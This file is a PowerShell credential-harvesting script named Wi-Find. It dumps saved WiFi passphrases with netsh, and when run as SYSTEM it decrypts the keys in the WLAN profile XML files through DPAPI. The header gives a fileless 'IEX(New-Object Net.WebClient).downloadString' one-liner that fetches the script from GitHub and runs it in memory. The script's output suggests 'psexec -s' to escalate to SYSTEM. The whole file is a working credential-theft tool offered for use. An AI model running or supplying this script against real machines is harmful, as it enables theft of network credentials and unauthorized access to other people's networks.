<#

.SYNOPSIS

	A PowerShell script to access saved WiFi credentials.
	
.DESCRIPTION

 This PowerShell script attempts to pull saved WPA2-Personal WiFi credentials via netsh and also reading
 WiFi configuration files you have NT AUTHORITY\SYSTEM
	
.EXAMPLE

	Installation:
		git clone https://github.com/Har6ard/Wi-Find.git
		cd Wi-Find
		cmd > powershell -ExecutionPolicy bypass wiFind.ps1
	
	Running in Memory:
		cmd > powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Har6ard/Wi-Find/refs/heads/main/wiFind.ps1')"
	
.NOTES

	Script Capabilities:
	
	1) Present the current network interfaces that are available
	2) Run basic netsh commands and pull any available SSID and passphrases available to the user
	3) If the network interfaces are down, and you have the ability to run a shell as NT AUTHORITY\SYSTEM,
	then the script can decrypt the passphrases in any WiFi configuration files available
	
.TODO:
	Add Windows vista,7,8, etc. support
	
#>
# Loading system security 
Add-Type -AssemblyName System.Security;
Add-Type -AssemblyName System.Core;
Add-Type -AssemblyName System.Text.Encoding;

echo "`n** Wi-Find Enumeration Script **`n"

function Display-Network-Configuration 
{
	echo "Network Configuration`n"
	try
	{
		Get-NetIPConfiguration
	}
	catch
	{
		Write-Host "[-] Potentially older version of PowerShell. Get-NetIPConfiguration unavailable"
	}
}

function Pull-WiFi-Information-With-Interface-Present 
{
	echo "[+] Pulling WiFi SSIDs and cleartext passwords if an interface is available..."
	$wifiProfiles = (netsh wlan show profiles) -match "All User Profile\s*: (.*)"
	
	 if ("$wifiProfiles" -eq "False")
	 {
		 "`t[-] No WiFi Profiles Present or no wireless interface present on the system"
		 "[+] Checking for WiFi configuration files"
		 Check-WiFi-Interface-Directories-Exist
	 }
	 else 
	 {
		 "[+] Found WiFi Profiles: `n"
		 for ($i = 0;$i -lt $wifiProfiles.Count; $i++) 
		 {
			 $cleanSSID = $wifiProfiles[$i].Split(":",2)[1].Trim()
			 Write-Host "[+] SSID: $cleanSSID"
			 try
			 {
				# Pulling any cleartext passwords available to current user context
				$PassphraseLookup = (netsh wlan show profile $cleanSSID key=clear) -match "Key Content"
				$CleanedPassphrase = $PassphraseLookup.Split(":",2)[1].Trim()
				Write-Host "`t[+] PassPhrase: $CleanedPassphrase`n"				 
			 } 
			 catch
			 {
				 Write-Host "`t[-] 'Key Content' field not present. Potential EAP or Open network.`n"
			 }
		 }
		 
	 }
}

function Check-WiFi-Interface-Directories-Exist
{
	# Below is the default Win10 WiFi XML Config file location
	$Default_WiFi_File_Path = "c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\"
	$Wifi_Interface_Directory_name = Get-ChildItem -Path $Default_WiFi_File_Path -Name
	
	if ($Wifi_Interface_Directory_name.Count -gt 0)
	{
		Write-Host "[+] Interface directories found. Beggining enumeration..."
		Pull-WiFi-Configurations-In-Directories
	}
	else
	{
		Write-Host "[-] No Interface directories found. Exiting."
	}
}

function Pull-WiFi-Configurations-In-Directories 
{
	# Below is the default Win10 WiFi XML Config file location
	$Default_WiFi_File_Path = "c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\"
	$Wifi_Interface_Directory_Name = Get-ChildItem -Path $Default_WiFi_File_Path -Name
	# We need to account for multiple interface directories each containing their own WiFi configuration files
	
	# Iteration through interface directories
	for ($i = 0;$i -lt $Wifi_Interface_Directory_Name.Count; $i++)
	{
		$WiFi_Configuration_Files_location = "$Default_WiFi_File_Path$Wifi_Interface_Directory_name\"
		Write-Host "[+] Enumerating Interface Directory: $WiFi_Configuration_Files_location for WiFi configuration files`n"
		$Configuration_Files = Get-ChildItem -Path $WiFi_Configuration_Files_location -Name
		
		# Begin Second Iteration for xml config files inside interface directories
		# Pull plaintext, but add warning and check to see if running as NT/SYSTEM
		foreach ($Configuration_File in $Configuration_Files)
		{
			Write-Host "[+] Found configuration file: $Configuration_File"
			Write-Host "[+] Printing 'keymaterial' field, which may be plaintext or a HEX object."
			
			# Begin parsing WiFi configuration XML files
			[xml]$xml = Get-Content "$WiFi_Configuration_Files_location$Configuration_File"
			Write-Host "[+] SSID: " $xml.WLANProfile.SSIDConfig.SSID.name
			Write-Host "[*] KeyMaterial: " $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
			
			# Checking for current user context. If NT AUTHORITY, then DPAPI can be accesed and configuration files can be read
			$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
			Write-Host "[+] Currently running as: $currentUserName"
			
			if ($currentUserName -match "NT AUTHORITY" -or $currentUserName -match "NT AUTHORITY\SYSTEM")
			{
				Write-Host "[+] Attempting to decrypt WiFi configuration files..." 
				# Converting HEX object into a byte array required before using DPAPI UnProtect method
				$keyBytes = [byte[]] ($xml.WLANProfile.MSM.security.sharedKey.keyMaterial -replace '^0x' -split '(..)' -ne '' -replace '^', '0x');
				
				# Invoking DPAPI UnProtect method
				$decryptedNetworkKeyBytes = [System.Security.Cryptography.ProtectedData]::UnProtect($keyBytes, $Null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
				
				# Convert decrypted passphrase bytes to readable string format
				$DecryptedKey = [System.Text.Encoding]::UTF8.GetString($decryptedNetworkKeyBytes);
				Write-Host "[+] SSID: " $xml.WLANProfile.SSIDConfig.SSID.name
				Write-Host "`t[*] Decrypted passphrase: $DecryptedKey"
				
			}
			else
			{
				Write-Host "`n`t[-] If you can run this script as NT Authority then it will attempt to decrypt WiFi credentials stored in configuration files"
				Write-Host "`t[INFO] To elevate privileges to NT AUTHORITY\SYSTEM, leverage psexec in an administrator shell:"
				Write-Host "`t[INFO] CMD > psexec.exe -s -i cmd.exe"
			}
			
		}
		
	}
	
}


Display-Network-Configuration
Pull-WiFi-Information-With-Interface-Present
